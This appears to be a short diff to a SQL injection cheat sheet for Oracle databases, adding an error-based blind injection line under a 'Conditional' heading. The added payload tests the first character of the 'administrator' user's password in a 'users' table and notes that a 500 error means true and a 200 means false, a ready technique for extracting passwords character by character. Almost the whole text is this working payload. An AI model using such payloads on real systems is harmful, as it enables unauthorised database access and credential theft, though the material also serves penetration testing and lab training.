@@ -22,4 +22,6 @@ SELECT SYS.DATABASE_NAME FROM DUAL;
 ## Conditional
 ```sql
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and substring(password,1,1)='a') || '     #=> TRUE ==>500 =>ERROR      FALSE ==> 200
 ```
